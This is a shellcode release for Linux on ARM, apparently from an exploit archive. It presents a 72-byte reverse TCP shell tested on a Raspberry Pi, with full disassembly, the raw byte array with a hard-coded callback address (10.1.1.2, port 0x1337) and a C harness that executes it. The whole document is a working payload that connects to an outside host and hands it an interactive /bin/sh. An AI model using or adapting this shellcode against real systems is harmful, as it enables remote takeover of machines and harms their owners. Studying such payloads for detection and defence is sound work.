/*
Title:     Linux/ARM - reverse_shell(tcp,10.1.1.2,0x1337)
execve("/bin/sh", [0], [0 vars]) - 72 bytes
Date:      2012-09-08
Tested on: ARM1176JZF-S (v6l) - Raspberry Pi
Author:    midnitesnake

00008054 <_start>:
    8054:       e28f1001        add     r1, pc, #1
    8058:       e12fff11        bx      r1
    805c:       2002            movs    r0, #2
    805e:       2101            movs    r1, #1
    8060:       1a92            subs    r2, r2, r2
    8062:       020f            lsls    r7, r1, #8
    8064:       3719            adds    r7, #25
    8066:       df01            svc     1
    8068:       1c06            adds    r6, r0, #0
    806a:       a108            add     r1, pc, #32     ; (adr r1,
808c <Dup+0x16>)
    806c:       2210            movs    r2, #16
    806e:       3702            adds    r7, #2
    8070:       df01            svc     1
    8072:       273f            movs    r7, #63 ; 0x3f
    8074:       2102            movs    r1, #2

00008076 <Dup>:
    8076:       1c30            adds    r0, r6, #0
    8078:       df01            svc     1
    807a:       3901            subs    r1, #1
    807c:       d5fb            bpl.n   8076 <Dup>
    807e:       a005            add     r0, pc, #20     ; (adr r0,
8094 <Dup+0x1e>)
    8080:       1a92            subs    r2, r2, r2
    8082:       b405            push    {r0, r2}
    8084:       4669            mov     r1, sp
    8086:       270b            movs    r7, #11
    8088:       df01            svc     1
    808a:       46c0            nop                     ; (mov r8, r8)
    808c:       37130002        .word   0x37130002
    8090:       0301010a        .word   0x0301010a
    8094:       6e69622f        .word   0x6e69622f
    8098:       0068732f        .word   0x0068732f
    809c:       00              .byte   0x00
    809d:       00              .byte   0x00
    809e:       46c0            nop                     ; (mov r8, r8)
*/
#include <stdio.h>
#include <string.h>

#define SWAP16(x)       ((x) << 8 | ((x) >> 8))

const unsigned char sc[] = {

        0x01, 0x10, 0x8F, 0xE2,
        0x11, 0xFF, 0x2F, 0xE1,

        0x02, 0x20, 0x01, 0x21,
        0x92, 0x1a, 0x0f, 0x02,
        0x19, 0x37, 0x01, 0xdf,
        0x06, 0x1c, 0x08, 0xa1,
        0x10, 0x22, 0x02, 0x37,
        0x01, 0xdf, 0x3f, 0x27,
        0x02, 0x21,

        0x30, 0x1c, 0x01, 0xdf,
        0x01, 0x39, 0xfb, 0xd5,
        0x05, 0xa0, 0x92, 0x1a,
        0x05, 0xb4, 0x69, 0x46,
        0x0b, 0x27,0x01, 0xdf,
        0xc0, 0x46,

        /* struct sockaddr */
        0x02, 0x00,
        /* port: 0x1337 */
        0x13, 0x37,
        /* ip: 10.1.1.2 */
        0x0A, 0x01, 0x01, 0x02,

        /* "/bin/sh\0" */
        0x2f, 0x62, 0x69, 0x6e,0x2f, 0x73, 0x68, 0x00
};

int main()
{
        printf("shellcode=%d bytes\n"
               "connecting to %d.%d.%d.%d:%hd\n", sizeof sc,
                sc[0x3c], sc[0x3d], sc[0x3e], sc[0x3f],
                SWAP16(*((unsigned short *)(sc+0x3a))));
        return ((int (*)(void))sc)();
}